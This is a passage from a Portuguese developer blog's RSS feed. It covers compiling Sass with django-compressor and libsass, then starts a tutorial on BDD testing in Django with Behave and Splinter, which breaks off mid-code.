    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;{% static &amp;#39;vendor/skeleton/skeleton.css&amp;#39; %}&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
{% endcompress %}

{% compress js %}
    &amp;lt;script src=&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
{% endcompress %}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Quando o internauta acessar a sua página, o resultado final será parecido com esse:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!-- index.html --&amp;gt;

&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/CACHE/css/0fb9d388202c.css&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;/static/CACHE/js/82f4dc99bcc1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bacana, não? Como a opção &lt;code class=&quot;language-text&quot;&gt;COMPRESS_ENABLED&lt;/code&gt; é por padrão o inverso de &lt;code class=&quot;language-text&quot;&gt;DEBUG&lt;/code&gt;,
em tempo de desenvolvimento você não verá os &lt;em&gt;assets&lt;/em&gt; comprimidos,
mas em tempo de &lt;em&gt;QA&lt;/em&gt; e produção, se o seu &lt;em&gt;Django&lt;/em&gt; estiver corretamente configurado,
sim.&lt;/p&gt;
&lt;h2&gt;Pré-compiladores&lt;/h2&gt;
&lt;p&gt;Você não precisa do &lt;em&gt;Ruby&lt;/em&gt; para utilizar &lt;em&gt;Sass&lt;/em&gt;. Hoje, com o advento da especificação
do &lt;em&gt;libsass&lt;/em&gt;, é possível ter a ferramenta em diferentes linguagens, como
&lt;a href=&quot;/tag/node.html&quot; title=&quot;Leia mais sobre Node.js&quot;&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::shell
$ pip install libsass&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt; dá suporte a execução de compiladores/transpiladores dado um
determinado &lt;code class=&quot;language-text&quot;&gt;type&lt;/code&gt;. Vamos ilustrar esse cenário com o uso de &lt;em&gt;Sass&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::python
# settings.py
COMPRESS_PRECOMPILERS = (
    (&amp;#39;text/x-sass&amp;#39;, &amp;#39;sassc {infile} {outfile}&amp;#39;),
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O binário &lt;code class=&quot;language-text&quot;&gt;sassc&lt;/code&gt; foi instalado no comando &lt;code class=&quot;language-text&quot;&gt;pip install&lt;/code&gt; acima. O parâmetro &lt;code class=&quot;language-text&quot;&gt;infile&lt;/code&gt;
será o próprio arquivo &lt;code class=&quot;language-text&quot;&gt;scss&lt;/code&gt;, e &lt;code class=&quot;language-text&quot;&gt;outfile&lt;/code&gt; será a saída do arquivo, já compilado para &lt;em&gt;CSS&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 620px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4911baf4d5081e0d229de140f03d2a02/935bc/django-style.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 41.14583333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAIABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMF/8QAFQEBAQAAAAAAAAAAAAAAAAAAAwH/2gAMAwEAAhADEAAAAc+wTSFP/8QAGBABAAMBAAAAAAAAAAAAAAAAAQACEhP/2gAIAQEAAQUCwESpfkT/xAAXEQADAQAAAAAAAAAAAAAAAAAAARIR/9oACAEDAQE/AZWEo//EABYRAQEBAAAAAAAAAAAAAAAAAAEAEv/aAAgBAgEBPwEW03//xAAWEAEBAQAAAAAAAAAAAAAAAAAAITH/2gAIAQEABj8CVr//xAAaEAACAgMAAAAAAAAAAAAAAAAAASExEUFR/9oACAEBAAE/IVPddZgjTSkbNj//2gAMAwEAAgADAAAAEA//AP/EABcRAQADAAAAAAAAAAAAAAAAAAABESH/2gAIAQMBAT8QjIof/8QAFhEBAQEAAAAAAAAAAAAAAAAAAQBh/9oACAECAQE/EFI21//EABsQAQACAwEBAAAAAAAAAAAAAAERIQBBcTFh/9oACAEBAAE/EAteaGJ+G8RR0UBDte4rMfS8/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Django com estilo!&amp;quot;&quot;
        title=&quot;Django com estilo!&quot;
        src=&quot;/static/4911baf4d5081e0d229de140f03d2a02/935bc/django-style.jpg&quot;
        srcset=&quot;/static/4911baf4d5081e0d229de140f03d2a02/7809d/django-style.jpg 192w,
/static/4911baf4d5081e0d229de140f03d2a02/4ecad/django-style.jpg 384w,
/static/4911baf4d5081e0d229de140f03d2a02/935bc/django-style.jpg 620w&quot;
        sizes=&quot;(max-width: 620px) 100vw, 620px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Django com estilo!&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Agora, a jogada será declarar em nosso &lt;em&gt;template&lt;/em&gt; que todas as folhas de estilo escritas
em &lt;em&gt;Sass&lt;/em&gt;, terão como &lt;code class=&quot;language-text&quot;&gt;type&lt;/code&gt; o valor &lt;code class=&quot;language-text&quot;&gt;text/x-sass&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::html
&amp;lt;!-- index.html --&amp;gt;

{% compress css %}
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;{% static &amp;#39;vendor/skeleton/normalize.css&amp;#39; %}&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;{% static &amp;#39;vendor/skeleton/skeleton.css&amp;#39; %}&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;{% static &amp;#39;scss/app.scss&amp;#39; %}&amp;quot; type=&amp;quot;text/x-sass&amp;quot;&amp;gt;
{% endcompress %}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A partir de agora, no momento de execução do &lt;em&gt;Compressor&lt;/em&gt;, além de minificar e concatenar
as folhas de estilo, também interpretará arquivos &lt;em&gt;Sass&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;E com isso, mais uma vez, mostramos que é possível ter um projeto &lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;,
utilizando ferramentas bacanas (como o &lt;em&gt;Sass&lt;/em&gt;), sem necessariamente
adicionar uma linguagem diferente à sua &lt;em&gt;stack&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O ideal é que o processo de &lt;em&gt;build&lt;/em&gt; seja executado durante o procedimento
de &lt;em&gt;deploy&lt;/em&gt; do seu projeto (através do comando &lt;code class=&quot;language-text&quot;&gt;python manage.py compress&lt;/code&gt;). Para isso,
é necessário ativar o
&lt;a href=&quot;http://django-compressor.readthedocs.io/en/latest/scenarios/#offline-compression&quot; title=&quot;Offline compression&quot;&gt;&lt;em&gt;offline compression&lt;/em&gt; do &lt;em&gt;Django Compressor&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; vamos falar sobre &lt;em&gt;Django&lt;/em&gt; + &lt;em&gt;ES6&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima...&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://django-compressor.readthedocs.io/en/latest/&quot;&gt;&lt;em&gt;Django Compressor - Compresses linked and inline JavaScript or CSS into a single cached file&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://hongminhee.org/libsass-python/&quot;&gt;&lt;em&gt;libsass - Sass/SCSS for Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[BDD com Django e Behave]]></title><description><![CDATA[Testar o comportamento da sua aplicação, ao invés de pequenos módulos isolados,
é uma grande prática no que diz respeito a escrita de testes que guiem o
seu desenvolvimento. Deixando a polêmica do "TDD is dead"
de lado, criar cenários que garantem um determinado fluxo, além de servir
como um…]]></description><link>https://klauslaube.com.br/2016/02/03/bdd-com-django-e-behave.html</link><guid isPermaLink="false">https://klauslaube.com.br/2016/02/03/bdd-com-django-e-behave.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Wed, 03 Feb 2016 23:50:00 GMT</pubDate><content:encoded>&lt;p&gt;Testar o comportamento da sua aplicação, ao invés de pequenos módulos isolados,
é uma grande prática no que diz respeito a escrita de testes que guiem o
seu desenvolvimento.&lt;/p&gt;
&lt;p&gt;Deixando a polêmica do &quot;&lt;a href=&quot;http://david.heinemeierhansson.com/2014/tdd-is-dead-long-live-testing.html&quot; title=&quot;TDD is dead. Long live testing.&quot;&gt;TDD is dead&lt;/a&gt;&quot;
de lado, criar cenários que garantem um determinado fluxo, além de servir
como um excelente contrato à sua suite de aceitação, é uma ótima ferramenta
para garantir que a integração &lt;em&gt;back-end/front-end&lt;/em&gt; está funcionando de acordo
com o esperado.&lt;/p&gt;
&lt;p&gt;Devo ser sincero com você, caro leitor: Fazer &lt;a href=&quot;/tag/bdd.html&quot; title=&quot;Leia mais sobre BDD&quot;&gt;&lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;
com &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; (IMO) sempre foi uma dor de cabeça.
Já utilizei algumas ferramentas, como &lt;a href=&quot;/2011/07/18/ferramentas-de-testes-em-django-parte-1.html&quot;&gt;&lt;em&gt;unittest&lt;/em&gt;&lt;/a&gt;
focado em comportamento, &lt;a href=&quot;/2011/07/18/ferramentas-de-testes-em-django-parte-1.html&quot;&gt;&lt;em&gt;doctests&lt;/em&gt;&lt;/a&gt;,
&lt;a href=&quot;/2011/07/23/ferramentas-de-testes-em-django-parte-2.html&quot;&gt;&lt;em&gt;Lettuce&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Pycurracy&lt;/em&gt; e até mesmo &lt;em&gt;Jasmine&lt;/em&gt;...
Nada pareceu ser &quot;o certo a se fazer&quot;.&lt;/p&gt;
&lt;p&gt;Recentemente esbarrei com um artigo ensinando a usar o &lt;a href=&quot;http://pythonhosted.org/behave/&quot; title=&quot;BDD for Python&quot;&gt;&lt;em&gt;Behave&lt;/em&gt;&lt;/a&gt;,
um &lt;em&gt;engine&lt;/em&gt; de testes &lt;em&gt;BDD&lt;/em&gt; para &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;...
E foi aí que a minha opinião mudou.&lt;/p&gt;
&lt;h2&gt;Oh, behave!&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Behave&lt;/em&gt; é uma biblioteca &lt;em&gt;Python&lt;/em&gt; que permite a escrita de &lt;em&gt;specs&lt;/em&gt; em linguagem humana,
e a execução dos cenários através de &lt;em&gt;asserts&lt;/em&gt; em &quot;linguagem de programação&quot;. Agnóstico de &lt;em&gt;framework&lt;/em&gt;,
é um &lt;em&gt;engine&lt;/em&gt; promissor, &lt;a href=&quot;http://pythonhosted.org/behave/tutorial.html&quot; title=&quot;Conheça o tutorial do Behave&quot;&gt;fácil de usar&lt;/a&gt;,
e que possui uma boa comunidade dando suporte.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 480px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bb6cb6691f182c0f762c2544f9a48ceb/7cc5e/oh-behave.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 86.45833333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAARABQDASIAAhEBAxEB/8QAGQABAAMBAQAAAAAAAAAAAAAAAAIDBAEF/8QAFgEBAQEAAAAAAAAAAAAAAAAAAgMA/9oADAMBAAIQAxAAAAGeC+3Lzms5ciPUis//xAAbEAADAAIDAAAAAAAAAAAAAAAAAQIDEBETQf/aAAgBAQABBQLNdi5FLZMWxxlO1zpnv//EABkRAAEFAAAAAAAAAAAAAAAAAAEAAhARIf/aAAgBAwEBPwFpxWJ//8QAGREAAgMBAAAAAAAAAAAAAAAAAAECEBMh/9oACAECAQE/AXHplSP/xAAdEAABBAIDAAAAAAAAAAAAAAAAAQIRIRASQXGx/9oACAEBAAY/AtuCyhXFekQ3C9in/8QAGxAAAwEBAAMAAAAAAAAAAAAAAAERITFRcbH/2gAIAQEAAT8hfqJqZBr7Yjq1CunclwYWEhW9ye4efZ8ow//aAAwDAQACAAMAAAAQw+f+/8QAGREAAwADAAAAAAAAAAAAAAAAAAERMVFx/9oACAEDAQE/EE1Rlvo8n//EABgRAAMBAQAAAAAAAAAAAAAAAAARITFR/9oACAECAQE/EJEVWcMH/8QAHRAAAgMAAgMAAAAAAAAAAAAAAREAIUEx8GGhwf/aAAgBAQABPxAcflAuyrUNZMHWVfLiKgEgo65ceWMEwqJ8iDDbTg7GgYoUCxWQ8dMnDooz3vgn/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Austin Powers: Oh behave (flickr.com)&amp;quot;&quot;
        title=&quot;Austin Powers: Oh behave (flickr.com)&quot;
        src=&quot;/static/bb6cb6691f182c0f762c2544f9a48ceb/7cc5e/oh-behave.jpg&quot;
        srcset=&quot;/static/bb6cb6691f182c0f762c2544f9a48ceb/7809d/oh-behave.jpg 192w,
/static/bb6cb6691f182c0f762c2544f9a48ceb/4ecad/oh-behave.jpg 384w,
/static/bb6cb6691f182c0f762c2544f9a48ceb/7cc5e/oh-behave.jpg 480w&quot;
        sizes=&quot;(max-width: 480px) 100vw, 480px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Austin Powers: Oh behave (flickr.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Você pode escrever a integração do &lt;em&gt;lib&lt;/em&gt; com o &lt;em&gt;Django&lt;/em&gt;, como demonstrado na &lt;a href=&quot;http://pythonhosted.org/behave/django.html&quot; title=&quot;Exemplo de integração entre Behave e Django&quot;&gt;documentação oficial&lt;/a&gt;.
Como eu sou preguiçoso, prefiro utilizar o módulo &lt;code class=&quot;language-text&quot;&gt;behave-django&lt;/code&gt;,
criado por &lt;a href=&quot;https://github.com/mixxorz&quot; title=&quot;Perfil do mixxorz no GitHub&quot;&gt;Mitchel Cabuloy&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install behave-django&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não podemos esquecer de colocá-lo no &lt;code class=&quot;language-text&quot;&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;INSTALLED_APPS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;behave_django&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora basta criar uma estrutura na raíz do seu projeto (no mesmo nível do &lt;code class=&quot;language-text&quot;&gt;manage.py&lt;/code&gt;), com a seguinte formação:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;features/
    steps/
        steps.py
    environment.py
    funcionalidade.feature&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vamos para um exemplo mais prático: &lt;em&gt;Eu quero que minha home exiba meu nome de usuário, caso eu esteja logado&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Começaremos pelo arquivo &lt;code class=&quot;language-text&quot;&gt;.feature&lt;/code&gt;. Vou chamá-lo de &lt;code class=&quot;language-text&quot;&gt;features/home-logada.feature&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Feature: Logged in page

    Scenario: Access index page

        Given an authenticated user
        When I access the home page
        Then I see my username printed&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Já podemos executar o &lt;code class=&quot;language-text&quot;&gt;behave&lt;/code&gt; através do &lt;code class=&quot;language-text&quot;&gt;manage.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py behave&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Você verá uma saída sinalizando que nosso cenário está montado, mas
que ainda não há testes executando de fato.&lt;/p&gt;
&lt;p&gt;O arquivo de teste pode ter o nome que você desejar, o &lt;em&gt;Behave&lt;/em&gt; olhará
para cada ocorrência dentro de &lt;code class=&quot;language-text&quot;&gt;steps/&lt;/code&gt; e coletará os passos que serão
usados para a execução das especificações.&lt;/p&gt;
&lt;p&gt;Mas antes de escrevermos os testes, vamos falar de uma ferramenta essencial
quando estamos fazendo testes de interface &lt;em&gt;web&lt;/em&gt; com &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Splinter&lt;/h2&gt;
&lt;p&gt;Diretamente da &lt;a href=&quot;https://splinter.readthedocs.org/en/latest/&quot; title=&quot;Documentação do Splinter&quot;&gt;documentação oficial&lt;/a&gt; do &lt;em&gt;Splinter&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Splinter is an open source tool for testing web applications using Python. It lets you automate browser actions,
such as visiting URLs and interacting with their items.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A ferramenta fornece uma &lt;em&gt;API&lt;/em&gt; única para diferentes ferramentas de
testes de interface &lt;em&gt;web&lt;/em&gt;, como &lt;em&gt;Selenium&lt;/em&gt;, &lt;em&gt;PhantomJS&lt;/em&gt; e &lt;em&gt;zope.testbrowser&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Conseguimos instalá-la de forma muito fácil, através do comando &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install splinter&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;É ele que nos permite, através de sua interface, escrever testes utilizando o driver do
&lt;em&gt;Firefox&lt;/em&gt; (por exemplo), e deixar as &lt;em&gt;tasks&lt;/em&gt; executando em nosso servidor de integração
contínua com um driver &lt;em&gt;headless&lt;/em&gt;, como o &lt;em&gt;PhantomJS&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Django + Behave + Splinter == Epic Win&lt;/h3&gt;
&lt;p&gt;Podemos utilizar o &lt;em&gt;Splinter&lt;/em&gt; juntamente com a mecânica de teste do &lt;em&gt;Behave&lt;/em&gt;.
A maneira mais fácil é através do esquema de configuração da suite,
criando o arquivo &lt;code class=&quot;language-text&quot;&gt;features/environment.py&lt;/code&gt;, com o seguinte conteúdo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; splinter &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Browser


&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;before_all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Browser&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;server_url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;http://localhost:8000&apos;&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;after_all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;quit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! O contexto dos nossos testes tem a propriedade &lt;code class=&quot;language-text&quot;&gt;browser&lt;/code&gt;, que é a instância do &lt;em&gt;Splinter&lt;/em&gt;
para execução dos testes de interface.&lt;/p&gt;
&lt;p&gt;As &lt;em&gt;specs&lt;/em&gt; executarão com o &lt;em&gt;Firefox&lt;/em&gt;, por padrão. Caso queira alterar o navegador,
basta especificá-lo na instância de &lt;code class=&quot;language-text&quot;&gt;Browser&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Browser&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;chrome&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Dado um determinado cenário&lt;/h2&gt;
&lt;p&gt;Vamos escrever o código &lt;em&gt;Python&lt;/em&gt; necessário para atender a seguinte condição:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Given an authenticated user&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Para isso, criaremos um &lt;em&gt;step&lt;/em&gt; específico para autenticação:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# features/steps/auth.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; behave &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; given
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;contrib&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;auth&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;models &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; User


&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@given&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;an authenticated user&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;given_auth_user&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
